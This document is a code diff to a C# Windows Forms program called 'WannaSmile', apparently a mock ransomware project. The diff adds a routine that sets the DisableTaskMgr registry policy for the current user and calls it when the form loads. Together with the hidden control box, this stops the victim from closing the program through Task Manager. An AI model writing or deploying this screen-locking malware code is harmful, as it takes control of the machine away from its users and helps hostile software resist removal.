@@ -2,9 +2,9 @@
 // This is just a project create for fun by Ryo3504
 // Please do not take it for profit purposes
 //--------------------------------------------------
+using Microsoft.VisualBasic;
+using Microsoft.Win32;
 using System;
-using System.Diagnostics;
-using System.IO;
 using System.Windows.Forms;
 
 namespace WannaSmile
@@ -28,16 +28,51 @@ namespace WannaSmile
 
 			//Hide Control Box
 			ControlBox = false;
-			TaskmgrBlock();
+
+			//Task Manager Action: Enable
+			//EnableTaskManager();
+
+			//Task Manager Action: Disable
+			DisableTaskManager();
 		}
 
-		void TaskmgrBlock() 
+		#region Task Manager Action
+		private void DisableTaskManager()
 		{
-			ProcessStartInfo psi = new ProcessStartInfo(System.IO.Path.Combine(Environment.SystemDirectory, "taskmgr.exe"));
-			psi.RedirectStandardOutput = false;
-			psi.WindowStyle = ProcessWindowStyle.Hidden;
-			psi.UseShellExecute = true;
+			RegistryKey regkey = default(RegistryKey);
+			string keyValueInt = "1";
+			string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+			try
+			{
+				regkey = Registry.CurrentUser.CreateSubKey(subKey);
+				regkey.SetValue("DisableTaskMgr", keyValueInt);
+				regkey.Close();
+			}
+			catch (Exception ex)
+			{
+				Interaction.MsgBox(ex.Message, MsgBoxStyle.Critical, "Registry Error!");
+			}
 		}
+
+		private void EnableTaskManager()
+		{
+			RegistryKey regkey = default(RegistryKey);
+			string keyValueInt = "0";
+			//0x00000000 (0)
+			string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+			try
+			{
+				regkey = Registry.CurrentUser.CreateSubKey(subKey);
+				regkey.SetValue("DisableTaskMgr", keyValueInt);
+				regkey.Close();
+			}
+			catch (Exception ex)
+			{
+				Interaction.MsgBox(ex.Message, MsgBoxStyle.Critical, "Registry Error!");
+			}
+
+		}
+		#endregion
 
 		#region Button Event
 		/// <summary>
